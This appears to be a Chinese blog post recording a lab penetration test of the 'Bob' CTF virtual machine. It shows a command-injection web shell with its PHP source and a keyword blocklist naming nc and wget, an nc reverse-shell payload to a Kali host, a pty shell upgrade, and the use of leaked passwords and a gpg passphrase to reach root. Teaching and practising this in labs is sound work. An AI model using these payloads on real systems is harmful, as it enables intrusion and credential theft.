class="code"><pre><code class="hljs sh">POST /dev_shell.php HTTP/1.1<br><br>Host: 192.168.233.138<br><br>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0<br><br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<br><br>Accept-Language: en-US,en;q=0.5<br><br>Accept-Encoding: gzip, deflate<br><br>Content-Type: application/x-www-form-urlencoded<br><br>Content-Length: 18<br><br>Origin: http://192.168.233.138<br><br>Connection: close<br><br>Referer: http://192.168.233.138/dev_shell.php<br><br>Upgrade-Insecure-Requests: 1<br><br><br><br>in_command=/bin/ls<br></code></pre></td></tr></table></figure>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs sh">HTTP/1.1 200 OK<br><br>Date: Thu, 04 Jan 2024 06:35:48 GMT<br><br>Server: Apache/2.4.25 (Debian)<br><br>Vary: Accept-Encoding<br><br>Content-Length: 845<br><br>Connection: close<br><br>Content-Type: text/html; charset=UTF-8<br><br><br><br>&lt;html&gt;<br>&lt;body&gt;<br>    &lt;style&gt;<br>    <span class="hljs-comment">#back&#123;</span><br>      position: fixed;<br>      top: 0;<br>      left: 0;<br>      min-width: 100%;<br>      min-height: 100%;<br>      z-index:-10<br>    &#125;<br>      <span class="hljs-comment">#shell&#123;</span><br>        color: white;<br>        text-align: center;<br>    &#125;<br>  &lt;/style&gt;<br>  &lt;!-- WIP, don<span class="hljs-string">&#x27;t forget to report any bugs we don&#x27;</span>t want another breach guys<br>  -Bob --&gt;<br>  &lt;div <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;shell&quot;</span>&gt;<br>    &lt;h2&gt;<br>      dev_shell<br>    &lt;/h2&gt;<br>    &lt;form action=<span class="hljs-string">&quot;dev_shell.php&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span>&gt;<br>      Command: &lt;input <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;text&quot;</span> name=<span class="hljs-string">&quot;in_command&quot;</span> /&gt; &lt;br&gt;<br>      &lt;input <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;submit&quot;</span> value=<span class="hljs-string">&quot;submit&quot;</span>&gt;<br>    &lt;/form&gt;<br>    &lt;br&gt;<br>    &lt;h5&gt;Output:&lt;/h5&gt;<br>    WIP.jpg<br>about.html<br>contact.html<br>dev_shell.php<br>dev_shell.php.bak<br>dev_shell_back.png<br>index.html<br>index.html.bak<br>lat_memo.html<br>login.html<br>news.html<br>passwords.html<br>robots.txt<br>school_badge.png<br>  &lt;/div&gt;<br>    &lt;img src=<span class="hljs-string">&quot;dev_shell_back.png&quot;</span> <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;back&quot;</span> alt=<span class="hljs-string">&quot;&quot;</span>&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br><br></code></pre></td></tr></table></figure>
+<p>下载<code>bak</code>文件并查看<code>vim dev_shell.php.bak</code></p>
+<blockquote>
+<p>dev_shell.php.bak</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs shell">&lt;html&gt;<br>&lt;body&gt;<br>&lt;?php<br>//init<br><span class="hljs-meta prompt_">$</span><span class="language-bash">invalid = 0;</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash"><span class="hljs-built_in">command</span> = (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;in_command&#x27;</span>]);</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">bad_words = array(<span class="hljs-string">&quot;pwd&quot;</span>, <span class="hljs-string">&quot;ls&quot;</span>, <span class="hljs-string">&quot;netcat&quot;</span>, <span class="hljs-string">&quot;ssh&quot;</span>, <span class="hljs-string">&quot;wget&quot;</span>, <span class="hljs-string">&quot;ping&quot;</span>, <span class="hljs-string">&quot;traceroute&quot;</span>, <span class="hljs-string">&quot;cat&quot;</span>, <span class="hljs-string">&quot;nc&quot;</span>);</span><br>?&gt;<br>&lt;style&gt;<br><span class="hljs-meta prompt_">#</span><span class="language-bash">back&#123;</span><br>position: fixed;<br>top: 0;<br>left: 0;<br>min-width: 100%;<br>min-height: 100%;<br>z-index:-10<br>&#125;<br><span class="hljs-meta prompt_">#</span><span class="language-bash">shell&#123;</span><br>  color: white;<br>  text-align: center;<br>&#125;<br>&lt;/style&gt;<br>&lt;div id=&quot;shell&quot;&gt;<br>&lt;h2&gt;<br>dev_shell<br>&lt;/h2&gt;<br>&lt;form action=&quot;dev_shell.php&quot; method=&quot;post&quot;&gt;<br>Command: &lt;input type=&quot;text&quot; name=&quot;in_command&quot; /&gt; &lt;br&gt;<br>&lt;input type=&quot;submit&quot; value=&quot;submit&quot;&gt;<br>&lt;/form&gt;<br>&lt;br&gt;<br>&lt;h5&gt;Output:&lt;/h5&gt;<br>&lt;?php<br>system(&quot;running command...&quot;);<br>//executes system Command<br>//checks for sneaky ;<br>if (strpos($command, &#x27;;&#x27;) !==false)&#123;<br>  system(&quot;echo Nice try skid, but you will never get through this bulletproof php code&quot;); //doesn&#x27;t work :P<br>&#125;<br>else&#123;<br><span class="hljs-meta prompt_">  $</span><span class="language-bash">is_he_a_bad_man = explode(<span class="hljs-string">&#x27; &#x27;</span>, trim(<span class="hljs-variable">$command</span>));</span><br>  //checks for dangerous commands<br>  if (in_array($is_he_a_bad_man[0], $bad_words))&#123;<br>    system(&quot;echo Get out skid lol&quot;);<br>  &#125;<br>  else&#123;<br>    system($_POST[&#x27;in_command&#x27;]);<br>  &#125;<br>&#125;<br>?&gt;<br>&lt;/div&gt;<br>&lt;img src=&quot;dev_shell_back.png&quot; id=&quot;back&quot; alt=&quot;&quot;&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br><br></code></pre></td></tr></table></figure>
+</blockquote>
+<p><strong>代码审计</strong>：根据代码审计发现黑名单，发现nc被过滤了，可以尝试绕过黑名单</p>
+<p><strong>反弹shell</strong>：之前网站页面内容中有透露网页存在shell且做了加固。因此我们需要提升权限，使用工具<code>nc</code>反弹shell，在抓包工具BP页面将输入更改为/<code>bin/nc -e /bin/bash 192.168.244.132 8888</code>，该IP为Kali的IP，因为我们需要让网页向Kali发送response，send一下，在命令行中查收结果，此时反弹shell成功，可以查看ls等黑名单中的命令。使用命令id可以看到我们拿到了用户<code>www-data</code>的shell。</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">nc -lvvp 7777<br><br>in_command=/bin/nc -e /bin/bash 192.168.233.135 7777<br></code></pre></td></tr></table></figure>
+<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104144346262.png" class title="image-20240104144346262">
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs sh">┌──(root㉿kali)-[~]<br>└─<span class="hljs-comment"># nc -lvvp 7777</span><br>listening on [any] 7777 ...<br>192.168.233.138: inverse host lookup failed: Unknown host<br>connect to [192.168.233.135] from (UNKNOWN) [192.168.233.138] 50180<br><span class="hljs-built_in">ls</span><br>WIP.jpg<br>about.html<br>contact.html<br>dev_shell.php<br>dev_shell.php.bak<br>dev_shell_back.png<br>index.html<br>index.html.bak<br>lat_memo.html<br>login.html<br>news.html<br>passwords.html<br>robots.txt<br>school_badge.png<br><span class="hljs-built_in">id</span> <br>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data),100(<span class="hljs-built_in">users</span>)<br></code></pre></td></tr></table></figure>
+<p><strong>进入交互式shell</strong>：使用Python的模块调用bash，前提是目标靶机有Python</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">python -c <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></code></pre></td></tr></table></figure>
+<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104145017010.png" class title="image-20240104145017010">
+<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104145328639.png" class title="image-20240104145328639">
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">cd</span>/<br>bash: <span class="hljs-built_in">cd</span>/: No such file or directory<br>www-data@Milburg-High:/var/www/html$ <span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br>WIP.jpg        dev_shell.php.bak   lat_memo.html   robots.txt<br>about.html     dev_shell_back.png  login.html      school_badge.png<br>contact.html   index.html          news.html<br>dev_shell.php  index.html.bak      passwords.html<br>www-data@Milburg-High:/var/www/html$ <span class="hljs-built_in">cat</span> flag.txt <br><span class="hljs-built_in">cat</span> flag.txt<br><span class="hljs-built_in">cat</span>: flag.txt: No such file or directory<br>www-data@Milburg-High:/var/www/html$ <span class="hljs-built_in">cd</span> ../../<br><span class="hljs-built_in">cd</span> ../../<br>www-data@Milburg-High:/var$ <span class="hljs-built_in">cd</span> ../<br><span class="hljs-built_in">cd</span> ../<br>www-data@Milburg-High:/$ <span class="hljs-built_in">ls</span> -a<br><span class="hljs-built_in">ls</span> -a<br>.    boot  flag.txt    initrd.img.old  lost+found  opt   run   sys  var<br>..   dev   home        lib             media       proc  sbin  tmp  vmlinuz<br>bin  etc   initrd.img  lib64           mnt         root  srv   usr  vmlinuz.old<br>www-data@Milburg-High:/$ <span class="hljs-built_in">cat</span> flag.txt<br><span class="hljs-built_in">cat</span> flag.txt<br><span class="hljs-built_in">cat</span>: flag.txt: Permission denied<br></code></pre></td></tr></table></figure>
+<p>浏览根目录文件找到flag.txt，flag.txt只有管理员有读写权限，so我们需要拿到管理员权限。在<code>etc</code>目录下发现了文件passwd，查看该文件，文件中包含用户名信息，其中就有Bob用户，通过网站页面信息了解到Bob可能是管理员。因此紧接着浏览bob的家目录，发现隐藏敏感文件<code>.old_passwordfile.html</code>，查看该文件发现了<code>jc</code>和<code>seb</code>的账号密码。</p>
+<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104160041914.png" class title="image-20240104160041914">
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@Milburg-High:/home/bob$ cat .old_passwordfile.html<br>cat .old_passwordfile.html<br>&lt;html&gt;<br><br>&lt;p&gt;<br>jc:Qwerty<br>seb:T1tanium_Pa$$word_Hack3rs_Fear_M3<br>&lt;/p&gt;<br><br>&lt;/html&gt;<br><br></code></pre></td></tr></table></figure>
+<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104160633573.png" class title="image-20240104160633573">
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs sh">jc@Milburg-High:/home/bob$ <span class="hljs-built_in">cd</span> /home/bob/<br><span class="hljs-built_in">cd</span> /home/bob/<br>jc@Milburg-High:/home/bob$ <span class="hljs-built_in">ls</span> -l<br><span class="hljs-built_in">ls</span> -l<br>total 32<br>drwxr-xr-x 2 bob bob 4096 Feb 21  2018 Desktop<br>drwxr-xr-x 3 bob bob 4096 Mar  5  2018 Documents<br>drwxr-xr-x 3 bob bob 4096 Mar  8  2018 Downloads<br>drwxr-xr-x 2 bob bob 4096 Feb 21  2018 Music<br>drwxr-xr-x 2 bob bob 4096 Feb 21  2018 Pictures<br>drwxr-xr-x 2 bob bob 4096 Feb 21  2018 Public<br>drwxr-xr-x 2 bob bob 4096 Feb 21  2018 Templates<br>drwxr-xr-x 2 bob bob 4096 Feb 21  2018 Videos<br>jc@Milburg-High:/home/bob$ <span class="hljs-built_in">cd</span> Documents<br><span class="hljs-built_in">cd</span> Documents<br>jc@Milburg-High:/home/bob/Documents$ <span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br>login.txt.gpg  Secret  staff.txt<br>jc@Milburg-High:/home/bob/Documents$ <span class="hljs-built_in">cat</span> login.txt.gpg<br><span class="hljs-built_in">cat</span> login.txt.gpg<br>o��J[V0w�q�OS����@P�i4��u<br>                         E,����8=kj�Z����9`�5G��4��!�����!�����Q:�1���Q�jc@Milburg-High:/home/bob/Documents$ <br><br></code></pre></td></tr></table></figure>
+<p><strong>解密<code>gpg</code>文件</strong><br>登上<code>jc</code>账号，浏览其家目录，没找到有用信息，保持旺盛的好奇心，浏览对方所有文件，搜集有用信息，最终我们在Bob家目录的documents中找到了文件<code>login.txt.gpg</code>（<code>gpg</code>是<code>linux</code>的加密格式），需要将该文件解密后查看。<br>解密<code>gpg</code>文件：查看Bob家目录的documents中的Secret文件夹，发现了文件<code>notes.sh</code>（<code>sh</code>后缀为<code>linux</code>下的shell脚本文件）查看该内容后开始猜测其含义，最终确定这是藏头诗，找到了密钥（<strong>HARPOCRATES</strong>），破解文件<code>login.txt.gpg</code>，并查看该文件内容。</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs sh">&lt;uments/Secret/Keep_Out/Not_Porn/No_Lookie_In_Here$ <span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br>notes.sh<br>&lt;uments/Secret/Keep_Out/Not_Porn/No_Lookie_In_Here$ ./notes.sh<br>./notes.sh<br>TERM environment variable not <span class="hljs-built_in">set</span>.<br>-= Notes =-<br>Harry Potter is my faviorite<br>Are you the real me?<br>Right, I<span class="hljs-string">&#x27;m ordering pizza this is going nowhere</span><br><span class="hljs-string">People just don&#x27;</span>t get me<br>Ohhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh &lt;sea santy here&gt;<br>Cucumber<br>Rest now your eyes are sleepy<br>Are you gonna stop reading this yet?<br>Time to fix the server<br>Everyone is annoying<br>Sticky notes gotta buy em<br>&lt;uments/Secret/Keep_Out/Not_Porn/No_Lookie_In_Here$ <br></code></pre></td></tr></table></figure>
+<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104155409288.png" class title="image-20240104155409288">
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">gpg --batch --passphrase HARPOCRATES -d login.txt.gpg<br></code></pre></td></tr></table></figure>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sh">jc@Milburg-High:/home/bob/Documents$ gpg --batch --passphrase HARPOCRATES -d login.txt.gpg<br>&lt;g --batch --passphrase HARPOCRATES -d login.txt.gpg<br>gpg: keybox <span class="hljs-string">&#x27;/home/jc/.gnupg/pubring.kbx&#x27;</span> created<br>gpg: AES encrypted data<br>gpg: encrypted with 1 passphrase<br>bob:b0bcat_<br>jc@Milburg-High:/home/bob/Documents$<br></code></pre></td></tr></table></figure>
+ <img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104161606959.png" class title="image-20240104161606959">
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">bob@Milburg-High:~/Documents$ <span class="hljs-built_in">id</span><br><span class="hljs-built_in">id</span><br>uid=1001(bob) gid=1001(bob) <span class="hljs-built_in">groups</span>=1001(bob),27(sudo)<br></code></pre></td></tr></table></figure>
+<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104161706416.png" class title="image-20240104161706416">
+<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104161832640.png" class title="image-20240104161832640">
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo cat /flag.txt<br>[sudo] password for bob: b0bcat_<br><br>CONGRATS ON GAINING ROOT<br><br>        .-.<br>       (   )<br>        |~|       _.--._<br>        |~|~:&#x27;--~&#x27;      |<br>        | | :   #root   |<br>        | | :     _.--._|<br>        |~|~`&#x27;--~&#x27;<br>        | |<br>        | |<br>        | |<br>        | |<br>        | |<br>        | |<br>        | |<br>        | |<br>        | |<br><br>   _____|_|_________ Thanks for playing ~c0rruptedb1t<br></code></pre></td></tr></table></figure>
+<h4><span id="三-总结">三、总结</span></h4><p>通过本次实训，我们全面了解了渗透测试的基本流程和操作方法。从初步的信息收集到最终获取目标主机的控制权，每一步都是为了更深入地理解目标系统的安全漏洞。通过这次实验，不仅加深了对理论知识的理解，还提高了实际操作能力。实训中使用的工具和技术，如<code>Nmap、Nikto、Burp Suite</code>等，是网络安全领域的基石，掌握这些工具对于未来的安全研究和职业生涯至关重要。</p>
+<p>此外，实训也强调了进行渗透测试时的道德和法律责任。所有测试活动都应在合法和道德的范围内进行。总之，本次实训不仅提高了技术技能，也增进了对网络安全重要性的认识。</p>
+
+	</article>
+
+	 
+    <div class="kira-post-copyright">
+        <strong>本文作者：</strong>moyuan<br>
+        <strong>本文链接：</strong><a href="https://moyuan10086.github.io/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/" title="https:&#x2F;&#x2F;moyuan10086.github.io&#x2F;2024&#x2F;02&#x2F;01&#x2F;实训记录&#x2F;" target="_blank" rel="noopener">https:&#x2F;&#x2F;moyuan10086.github.io&#x2F;2024&#x2F;02&#x2F;01&#x2F;实训记录&#x2F;</a><br>
+        
+            <strong>版权声明：</strong>本文采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/cn/deed.zh" target="_blank">CC BY-NC-SA 3.0 CN</a> 协议进行许可
+        
+    </div>
+
+  
+	<div class="kira-post-nav">
+		<nav class="post-nav">
+			  
+			<!-- 先找到与当前文字相同的目录 -->
+			   
+			<!-- 在找到当前文章所在的 index -->
+			          
+		</nav>
+	</div>
+	
+	<div class="kira-post-meta kira-rainbow">
+		
+			<a class="kirafont icon-container-fill -link" href="/categories/CTF/">CTF</a>
+		
+		
+			<a class="kirafont icon-tag-fill -none-link" href="/tags/%E6%BA%A2%E5%87%BA/" rel="tag">溢出</a>
+		
+	</div>
+	
+	<div class="kira-post-footer">
+		
+	<link rel="stylesheet" href="https://unpkg.com/gitalk@latest/dist/gitalk.css" />
+	<div id="gitalk"></div>
+	<script src="https://unpkg.com/gitalk@latest/dist/gitalk.min.js"></script>
+	<script type="text/javascript">
+		const gitalk = new Gitalk({
+			clientID: '-id-',
+			clientSecret: '-key-',
+			id: '实训记录',
+			repo: '-issue repo name-',
+			owner: '-your github username-',
+			admin: '-your github username-',
+			title: '',
+		});
+		gitalk.render('gitalk');
+	</script>
+
+
+		
+	<div class="giscus"></div>
+  
+    <script src="https://giscus.app/client.js"
+      data-repo="ch1ny/ch1ny.github.io"
+      data-repo-id="R_kgDOHGgizw"
+      data-category="General"
+      data-category-id="DIC_kwDOHGgiz84CU88t"
+      data-mapping="pathname"
+      data-strict="0"
+      data-reactions-enabled="1"
+      data-emit-metadata="0"
+      data-input-position="top"
+      data-theme="light"
+      data-lang="en"
+      data-loading="lazy"
+      crossorigin="anonymous"
+      async  
+    ></script>
+  
+
+	</div>
+	
+</div>
+
+				</div>
+			</div>
+			<div class="kira-right-column">
+	<a onclick="document.querySelector('#kira-top-header').scrollIntoView({behavior: 'smooth'});" class="kira-backtotop" aria-label="回到顶部" title="回到顶部">
+		<button class="mdui-fab mdui-ripple">
+			<i class="kirafont icon-caret-up"></i>
+		</button>
+	</a>
+</div>
+
+		</div>
+	</body>
+</html>
